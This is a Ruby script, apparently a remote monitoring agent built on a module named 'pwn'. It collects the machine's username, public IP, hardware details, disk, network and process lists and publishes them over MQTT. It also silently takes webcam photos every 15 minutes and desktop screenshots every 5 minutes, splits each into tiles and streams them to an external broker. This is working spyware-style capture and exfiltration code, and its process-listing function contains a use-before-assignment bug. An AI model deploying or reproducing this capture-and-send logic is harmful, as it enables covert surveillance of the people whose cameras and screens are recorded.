require_relative 'pwn'
require 'base64'
require 'msgpack'
require 'os'
require 'open-uri'
require 'sys/proctable'
include Sys

@ip = URI.open('http://whatismyip.akamai.com').read

def host()
  { :host => OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip }
end

def ip()
  { :ip => @ip }
end

def os()
  if OS.windows?
    return { :os => `ver`.strip }
  else
    return { :os => `neofetch --stdout --disable model kernel uptime packages shell resolution de wm wm_theme theme icons term term_font cpu gpu memory`.split(':')[1].strip }
  end
end

def cpu()
  if OS.windows? then
    return {
      :cpu => `wmic cpu get name /format:value`.strip.split('=')[1],
      :cpu_usage => `wmic cpu get loadpercentage /format:value`.strip.split('=')[1]
    }
  else
      return {
        :cpu => `neofetch --stdout --disable model kernel uptime packages shell resolution de wm wm_theme theme icons term term_font gpu memory distro`.split(':')[1].strip,
        :cpu_usage => `top -bn1 | grep "Cpu(s)" | sed "s/.*, *\\([0-9.]*\\)%* id.*/\\1/" | awk '{print 100 - $1}'`.to_i
      }
  end
end

def gpu()
  if OS.windows? then
    return {
      :gpu => `wmic path win32_VideoController get name /format:value`.strip.split('=')[1]
    }
  else
    return {
      :gpu => `neofetch --stdout --disable model kernel uptime packages shell resolution de wm wm_theme theme icons term term_font memory distro cpu`.split(':')[1].strip
    }
  end
end

def memory()
  if OS.windows? then
    mem_capacity = `wmic memorychip get capacity /format:value`.gsub(/\s/, "").split('Capacity=')
    mem_capacity.shift
    total_capacity = 0
    mem_capacity.each do |m|
      total_capacity += m.to_i
    end
    return {
      :total_capacity => total_capacity,
      :memory_usage => total_capacity - `wmic OS get FreePhysicalMemory /format:value`.gsub(/\s/, "").split('=')[1].to_i * 1000
    }
  else
    mem = `neofetch --stdout --disable model kernel uptime packages shell resolution de wm wm_theme theme icons term term_font distro cpu gpu`.split(':')[1].strip.split('/')
    return {
      :total_capacity => mem[1].strip.chomp('MiB').to_i * (1024 * 1024),
      :memory_usage => mem[0].strip.chomp('MiB').to_i * (1024* 1024)
    }
  end
end

def disk()
  if OS.windows? then
    drives = `wmic logicaldisk get size, freespace, caption`.strip.split("\n")
    drives.shift
    drives = drives.reject { |d| d.empty? }
    drives.map! do |d|
      d = d.gsub(/\s+/, ' ')
      d_info = d.split(' ')
      d = { :drive => d_info[0], :free_space => d_info[1], :size => d_info[2] }
    end
    return drives
  else
    root_drive = `df -h / | awk ' { print $2 $4 } '`.split('SizeAvail')[1].strip.split('G')
    return [
      {
        :drive => 'root',
        :free_space => root_drive[1].to_i * (1024 * 1024 * 1024),
        :size => root_drive[0].to_i * (1024 * 1024 * 1024)
      }
    ]
  end
end

def network()
  if OS.windows? then
    network_adapters = `wmic path Win32_PerfRawData_Tcpip_NetworkInterface get BytesReceivedPersec, BytesSentPersec, Name /format:value`.strip.split("\n")
    network_adapters = network_adapters.reject { |n| n.empty? }
    network_adapters.map! do |n|
      n = n.gsub(/\s+/, ' ')
    end
    network = []
    (0...network_adapters.length).step(3) do |n|
      network.push({
        :bytes_rec_persec => network_adapters[n].split('=')[1],
        :bytes_sent_persec => network_adapters[n+1].split('=')[1],
        :adapter => network_adapters[n+2].split('=')[1]
      })
    end

    return network
  else
    network_adapters = `awk '/:/ { print($1,$2, $10) }' < /proc/net/dev`.split("\n")
    network = []
    (0..network_adapters.length - 1).each do |n|
      network.push({
        :bytes_rec_persec => network_adapters[n].split(' ')[1],
        :bytes_sent_persec => network_adapters[n].split(' ')[2],
        :adapter => network_adapters[n].split(':')[0]
      })
    end
    
    return network
  end
end

def processes()
  processes = []
  if OS.windows? then
    ProcTable.ps do |p|
      processes.push({ :pid => p.pid, :name => p.comm, :user => '', :cpu => '', :mem => p.working_set_size })
    end
  else
    mem = `neofetch --stdout --disable model kernel uptime packages shell resolution de wm wm_theme theme icons term term_font distro cpu gpu`.split(':')[1].strip.split('/')
    mem_total = mem[1].strip.chomp('MiB').to_i * (1024 * 1024)
    ProcTable.ps do |p|
      processes.push({
        :pid => p.pid,
        :name => p.comm,
        :user => p.environ['USER'],
        :cpu => p.pctcpu,
        :mem => if p.pctmem.to_f > 0 then ((p.pctmem.to_f / 100) * mem_total).to_i else 0 end
      })
    end
    processes.select! { |p| p[:user] == user }
  end
  user = `whoami`.strip
  return processes.sort_by { |p| p[:mem] }.last(10).reverse
end

def webcam()
  if OS.windows? then
    `WebCamImageSave.exe /capture /Filename webcam.png`
    #`magick mogrify -resize 50% webcam.png`
    `magick convert -crop 10%x10% webcam.png webcam/webcam%d.png`
  else
    `fswebcam -d /dev/video0 webcam.png`
    #`magick mogrify -resize 50% webcam.png`
    `convert -crop 10%x10% webcam.png webcam/webcam%d.png`
  end
end

def desktop()
  if OS.windows? then
    `nircmd.exe savescreenshot desktop.png`
    #`magick mogrify -resize 25% desktop.png`
    `magick convert -crop 10%x10% desktop.png desktop/desktop%d.png`
  else
    `gnome-screenshot -f desktop.png`
    #`magick mogrify -resize 25% desktop.png`
    `convert -crop 10%x10% desktop.png desktop/desktop%d.png`
  end
end

pwn = Pwn.new

puts ip()
puts host()
puts os()
puts cpu()
puts gpu()
puts memory()
puts disk()
puts network()
puts processes()

# pwn.add_topic_callback('reedleoneil/#') do |message|
# 	if message.payload != '' then
# 	  puts message.topic
# 	  pwn.internals[:mqtt].publish(message.topic, nil, true, 2)
# 	end
# end

Thread.new {
  loop do
    if (pwn.internals[:mqtt].connected?) then
      pwn.publish('reedleoneil/system_info/host', host().to_msgpack)
      pwn.publish('reedleoneil/system_info/ip', ip().to_msgpack, true, 2)
      pwn.publish('reedleoneil/system_info/os', os().to_msgpack, true, 2)
      sleep 60
    end
  end
}

Thread.new {
  loop do
    if (pwn.internals[:mqtt].connected?) then
      pwn.publish('reedleoneil/system_info/cpu', cpu().to_msgpack, true, 2)
      pwn.publish('reedleoneil/system_info/memory', memory().to_msgpack, true, 2)
      sleep 3
    end
  end
}

Thread.new {
  loop do
    if (pwn.internals[:mqtt].connected?) then
      pwn.publish('reedleoneil/system_info/gpu', gpu().to_msgpack, true, 2)
      pwn.publish('reedleoneil/system_info/disk', disk().to_msgpack, true, 2)
      pwn.publish('reedleoneil/system_info/network', network().to_msgpack, true, 2)
      pwn.publish('reedleoneil/system_info/processes', processes().to_msgpack, true, 2)
      sleep 30
    end
  end
}

webcam_eta = Time.now + 15*60
Thread.new {
  loop do
    if (pwn.internals[:mqtt].connected?) then
      if webcam_eta <= Time.now then
        pwn.publish('reedleoneil/webcam/eta', { :eta => "00:00:00" }.to_msgpack, false, 2)
        webcam()
        for i in 0..99
          p "w: #{i.to_s}"
          payload = { :cell => i, :img => File.binread('webcam/webcam' + i.to_s + '.png') }.to_msgpack
          pwn.publish('reedleoneil/webcam', payload, false, 2)
          pwn.internals[:mqtt].loop_write
          sleep 0.1
        end
        webcam_eta = Time.now + 15*60
      else
        eta = Time.at(webcam_eta - Time.now)
        p "w " + "00" + ":" + format('%02d', eta.min) + ":" +  format('%02d', eta.sec)
        pwn.publish('reedleoneil/webcam/eta', { :eta => "00" + ":" + format('%02d', eta.min) + ":" +  format('%02d', eta.sec) }.to_msgpack, false, 2)
        pwn.internals[:mqtt].loop_write
        sleep 1
      end
    end
  end
}

desktop_eta = Time.now + 5*60
Thread.new {
  loop do
    if (pwn.internals[:mqtt].connected?) then
      if desktop_eta <= Time.now then
        pwn.publish('reedleoneil/desktop/eta', { :eta => "00:00:00" }.to_msgpack, false, 2)
        desktop()
        for i in 0..99
          p "d: #{i.to_s}"
          payload = { :cell => i, :img => File.binread('desktop/desktop' + i.to_s + '.png') }.to_msgpack
          pwn.publish('reedleoneil/desktop', payload, false, 2)
          pwn.internals[:mqtt].loop_write
          sleep 0.1
        end
        desktop_eta = Time.now + 5*60
      else
        eta = Time.at(desktop_eta - Time.now)
        p "d " + "00" + ":" + format('%02d', eta.min) + ":" +  format('%02d', eta.sec)
        pwn.publish('reedleoneil/desktop/eta', { :eta => "00" + ":" + format('%02d', eta.min) + ":" +  format('%02d', eta.sec) }.to_msgpack, false, 2)
        pwn.internals[:mqtt].loop_write
        sleep 1
      end
    end
  end
}

loop do
	begin
		if pwn.internals[:mqtt].connected? then
			pwn.internals[:mqtt].mqtt_loop
		else
			pwn.connect() if !pwn.connecting?
		end
	rescue StandardError => error
		puts error.full_message
			pwn.connect() if !pwn.connecting?
	end
end
